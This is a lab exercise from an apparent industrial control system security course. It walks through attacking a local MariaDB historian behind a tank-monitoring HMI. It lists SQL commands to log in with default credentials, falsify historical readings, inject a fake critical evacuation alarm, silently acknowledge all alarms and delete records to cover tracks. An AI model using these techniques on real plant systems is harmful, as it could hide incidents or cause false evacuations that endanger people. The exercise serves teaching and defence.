# Exercise 5: Database Exploitation

## The Situation

Behind the HMI sits a historian database - MariaDB storing every tank reading, every alarm, every event. This is where months or years of operational data lives.

If we can access it directly, we can do more than just read current values. We can rewrite history.

---

## What You'll Learn

- Accessing industrial historian databases
- Understanding the data schema
- Manipulating historical records
- Creating false alarms

---

## Tasks

### 1. Connect to the Database

The historian is running MariaDB. Let's connect:

```bash
docker exec -it gaspot-historian mysql -u lab -ppassword historian
```

If that works, you're in. Notice the credentials: username `lab`, password `password`. Not exactly Fort Knox.

### 2. Explore the Schema

Let's see what we're working with:

```sql
SHOW TABLES;
```

You should see three tables:
- `tanks` - Configuration data
- `tank_readings` - Time-series measurements
- `alarms` - Alert history

Examine each one:

```sql
DESCRIBE tanks;
DESCRIBE tank_readings;
DESCRIBE alarms;
```

### 3. Query Current Data

Get familiar with what's stored:

```sql
-- Tank configuration
SELECT * FROM tanks;

-- Recent readings (last 10)
SELECT * FROM tank_readings ORDER BY timestamp DESC LIMIT 10;

-- All alarms
SELECT * FROM alarms ORDER BY timestamp DESC;
```

How far back does the data go? How often are readings recorded?

### 4. Manipulate Historical Data

Here's where it gets interesting. Let's change a historical reading:

```sql
-- Find the most recent reading for tank 1
SELECT * FROM tank_readings WHERE tank_id = 1 ORDER BY timestamp DESC LIMIT 1;

-- Change that reading to show zero volume
UPDATE tank_readings
SET volume = 0
WHERE tank_id = 1
ORDER BY timestamp DESC
LIMIT 1;
```

Now check the Trends page in the HMI (http://localhost:5000/trends). Select Tank 1. See that sudden drop to zero? You just altered history.

### 5. Create a False Alarm

Alarms drive operator response. What if we inject a fake critical alarm?

```sql
INSERT INTO alarms (tank_id, alarm_type, severity, message, timestamp)
VALUES (1, 'OVERFLOW', 'CRITICAL', 'Tank overflow detected - EVACUATE IMMEDIATELY', NOW());
```

Check the Alarms page in the HMI. Your fake alarm should appear, marked as CRITICAL.

### 6. Acknowledge (Hide) Alarms

Maybe instead of creating alarms, an attacker wants to hide them:

```sql
-- Acknowledge all alarms (operators won't see them as "active")
UPDATE alarms SET acknowledged = TRUE;
```

Check the Alarms page again. The active alarm count should change.

### 7. Cover Your Tracks

A sophisticated attacker might want to clean up:

```sql
-- Delete the fake alarm
DELETE FROM alarms WHERE message LIKE '%EVACUATE%';

-- Delete recent manipulated readings
DELETE FROM tank_readings
WHERE timestamp > DATE_SUB(NOW(), INTERVAL 5 MINUTE);
```

Of course, deleting records creates its own anomalies - gaps in the data that a careful analyst might notice.

### 8. Exit the Database

```sql
EXIT;
```

---

## Think About It

With database access, an attacker can:
- Read all historical data
- Modify readings to hide incidents or create false ones
- Inject alarms to cause panic or hide real problems
- Delete evidence of tampering

The credentials we used were trivially guessable. In many real facilities, historian databases have:
- Default passwords
- Shared credentials
- No network segmentation

---

## Useful Queries for Assessment

```sql
-- How much data exists?
SELECT COUNT(*) FROM tank_readings;

-- Data time range
SELECT MIN(timestamp), MAX(timestamp) FROM tank_readings;

-- Readings per tank
SELECT tank_id, COUNT(*) as readings FROM tank_readings GROUP BY tank_id;

-- Alarm summary
SELECT severity, COUNT(*) as count FROM alarms GROUP BY severity;
```

---

## What's Next

You've now compromised all three components: ATG, HMI, and database. Let's combine these techniques into a realistic attack scenario.

Continue to [Exercise 6: Attack Chain](E06_ATTACK_CHAIN.md)

---

## Reference

See [Database Reference](docs/DATABASE_REFERENCE.md) for complete schema documentation and more query examples.

---

## Notes

**Historian Security**: Real historian databases (OSIsoft PI, Wonderware, etc.) often have similar issues. Network segmentation and proper access controls are critical.

**Audit Trails**: A properly configured historian should log all queries and modifications. This one doesn't - which is realistic for many legacy installations.
